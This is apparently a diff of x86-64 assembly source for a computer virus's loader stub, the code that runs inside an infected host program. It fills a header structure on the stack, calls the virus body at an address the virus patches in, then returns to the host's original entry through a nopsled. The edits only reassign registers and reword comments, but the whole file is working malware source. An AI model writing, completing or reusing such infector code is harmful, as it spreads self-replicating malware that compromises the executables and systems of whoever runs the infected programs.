@@ -1,4 +1,3 @@
-
 section .text
 	global loader_entry
 	global call_virus
@@ -28,7 +27,7 @@ loader_entry:
 
 ;----------------------------------; launch infection routines
 
-; space for structure fields
+; allocate space for structure fields
 	sub rsp, end_virus_header - virus_header_struct
 
 ; dist_nopsled_loader
@@ -36,25 +35,25 @@ loader_entry:
 	mov r11, [r11]
 	mov [rsp + 0x40], r11
 ; dist_client_loader
-	lea r11, [rel virus_header_struct + 0x38]
-	mov r11, [r11]
-	mov [rsp + 0x38], r11
+	lea rcx, [rel virus_header_struct + 0x38]
+	mov rcx, [rcx]
+	mov [rsp + 0x38], rcx
 ; dist_header_loader
-	lea r11, [rel virus_header_struct + 0x30]
-	mov r11, [r11]
-	mov [rsp + 0x30], r11
+	lea rdx, [rel virus_header_struct + 0x30]
+	mov rdx, [rdx]
+	mov [rsp + 0x30], rdx
 ; dist_vircall_loader
-	lea r11, [rel virus_header_struct + 0x28]
-	mov r11, [r11]
-	mov [rsp + 0x28], r11
+	lea rbx, [rel virus_header_struct + 0x28]
+	mov rbx, [rbx]
+	mov [rsp + 0x28], rbx
 ; dist_virus_loader
-	lea r11, [rel virus_header_struct + 0x20]
-	mov r11, [r11]
-	mov [rsp + 0x20], r11
+	lea rsi, [rel virus_header_struct + 0x20]
+	mov rsi, [rsi]
+	mov [rsp + 0x20], rsi
 ; loader_size
-	lea r11, [rel virus_header_struct + 0x18]
-	mov r11, [r11]
-	mov [rsp + 0x18], r11
+	lea rdi, [rel virus_header_struct + 0x18]
+	mov rdi, [rdi]
+	mov [rsp + 0x18], rdi
 ; loader_entry
 	lea r8, [rel loader_entry]
 	mov [rsp + 0x10], r8
@@ -69,12 +68,13 @@ loader_entry:
 ; pass structure address
 	mov rdi, rsp
 call_virus:
-	call virus                 ; call virus (addr rewritten by virus)
+	call virus                 ; address rewritten by virus
 
-; free space for structure fields
+; free structure fields space
 	add rsp, end_virus_header - virus_header_struct
 
 ;----------------------------------; restore registers
+
 return_to_client:
 	pop r15                    ; restore r15
 	pop r14                    ; restore r14
@@ -96,7 +96,7 @@ nopsled:
 	nop
 	nop
 jump_back_to_client:
-	jmp 0xffffffff             ; jump back to entry (addr written by virus)
+	jmp 0xffffffff             ; address rewritten by virus
 loader_exit:
 
 virus_header_struct:
